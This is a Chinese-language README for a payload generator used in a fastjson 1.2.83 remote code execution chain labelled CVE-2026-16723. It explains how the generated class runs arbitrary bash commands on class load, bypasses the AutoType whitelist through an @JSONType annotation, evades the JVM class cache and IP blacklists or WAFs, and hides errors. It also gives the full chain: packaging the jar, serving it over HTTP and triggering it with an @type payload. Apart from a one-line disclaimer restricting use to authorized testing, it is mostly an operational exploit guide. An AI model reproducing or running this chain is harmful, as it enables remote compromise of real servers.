# FastJson 1.2.83 GenProbe2

fastjson 1.2.83 JNDI(`jar:` 协议) 攻击链的**恶意类生成器** —— 用 ASM 在运行时动态生成一个带 `@JSONType` 注解、`<clinit>` 里执行任意命令的 Java 类，供 CVE-2026-16723 复现 / 验证使用。

> 本仓库内容用于授权环境下的漏洞验证与防御研究。

## 这个文件干什么

`GenProbe2.java` 不是漏洞利用本体，而是**造弹器**：它输出 `POC.class`，你把 `POC.class` 打进 `probe.jar` 放到 HTTP 服务器上，再用 fastjson 反序列化把类名指向

```
jar:http://<attack-ip>:<port>/<jarName>!/<entryName>
```

目标 JVM（fastjson 加载类 → 走 `URLClassLoader` → `jar:` 协议远程拉取 → 加载 `POC`）执行 `POC` 的静态块，命令就跑了。

生成出来的类有三处刻意设计，每一处对应绕过/规避一个真实卡点：

| 生成物特征 | 作用 |
|---|---|
| 类级注解 `@com.alibaba.fastjson.annotation.JSONType(orders = {"x"})` | 让 fastjson 的注解扫描阶段把该类判定为 `hasJsonType`，**绕过 AutoType 白名单校验**（1.2.83 默认关闭 autoType，但带 `@JSONType` 的类会走另一条放行分支） |
| `static {}`（`<clinit>`）里 `Runtime.getRuntime().exec(new String[]{"bash","-c",CMD})` | 类加载即执行。用 `String[]` 形式调 `exec`，等价于 `bash -c CMD`，所以 CMD 里管道、重定向、`$()`、反弹 shell 等任意 bash 语法都成立（不受 `Runtime.exec(String)` 分词限制） |
| 内部类名 = `jar:http://IP:PORT/<jarName>!/<entryName>`（带 `:` `/` `!` 的 URL） | 每次换 `jarName`/`entryName`（如 `probe2`/`POC2`）内部类名就变成全新字符串，**绕过 JVM 同名类缓存**——目标服务不用重启就能反复换命令打 |

ASM 不校验 visit 的类名合法性，`ClassWriter.COMPUTE_FRAMES` 负责算栈帧，异常表把整个命令执行块包起来（`catch (Exception) {}`），保证 `exec` 失败也不会让加载方抛错暴露。

## 用法

```bash
# 编译（需要 asm.jar，或用 maven 依赖 org.ow2.asm:asm）
javac -cp asm-9.x.jar -d . GenProbe2.java

# 生成 POC.class
java -cp .;asm-9.x.jar GenProbe2 <ipDecimal> <port> <outDir> [jarName] [entryName]
```

参数：

| 参数 | 说明 |
|---|---|
| `ipDecimal` | 攻击机 IP 的**十进制整数**形式（如 `3232235777` = `192.168.1.1`）。在 fastjson/jar URL 里用十进制可避开 IP 字面量黑名单与部分 WAF |
| `port` | 存放 jar 的 HTTP 端口 |
| `outDir` | `POC.class` 输出目录（不存在会自动创建） |
| `jarName` | 远程 jar 文件名（**不带** `.jar`），默认 `probe` |
| `entryName` | jar 内类条目名，默认 `POC` |

命令来源（优先级从高到低）：

1. **同目录 `cmd.txt` 第一行**（推荐：整条 bash 命令写一行，避开 Windows 命令行引号地狱；以 `#` 开头的行被跳过）
2. 没有 `cmd.txt` 时默认执行 marker：`touch /tmp/PWNED_CVE-2026-16723`

输出示例：

```
[*] 将执行命令: id > /tmp/pwned
[*] jarName=probe2 entryName=POC2
[+] 写出 D:\out\POC.class (4213 bytes)
[+] 内部类名 = jar:http://3232235777:8000/probe2!/POC2
```

拿到 `POC.class` 之后的完整链条：

```bash
# 1. 打包（jar 内路径必须是 POC2.class，与 entryName 对齐）
mkdir build && cp POC.class build/POC2.class
cd build && jar cf ../probe2.jar POC2.class && cd ..

# 2. 起 HTTP 服务（目标要能回连这个 IP:PORT）
python3 -m http.server 8000

# 3. 触发：把内部类名原样填进 fastjson 的 @type
#    {"@type":"jar:http://3232235777:8000/probe2!/POC2","x":"1"}
```

换命令时只改 `cmd.txt` 并递增 `jarName`/`entryName`（`probe3`/`POC3` …），不必重启目标服务。

## 文件

| 文件 | 说明 |
|---|---|
| `GenProbe2.java` | 生成器源码（ASM 直接写字节码，无反射、无模板） |
| `GenProbe2.class` | 上面源码的编译产物，可直接 `java GenProbe2 ...` 运行（仍需把 `asm.jar` 放进 classpath） |

依赖：`org.objectweb.asm`（`ClassWriter` / `MethodVisitor` / `AnnotationVisitor` / `Label`），实测 ASM 9.x。

## 关联 CVE

CVE-2026-16723 —— fastjson 1.2.83 在特定条件下 AutoType 白名单判定不严，`@JSONType` 注解类可在未开启 `autoTypeSupport` 时被实例化/加载，配合 `jar:` 远程类加载形成 JNDI 注入 → 远程代码执行。本工具用于产出该链路上的"远程类"这一步的 payload。
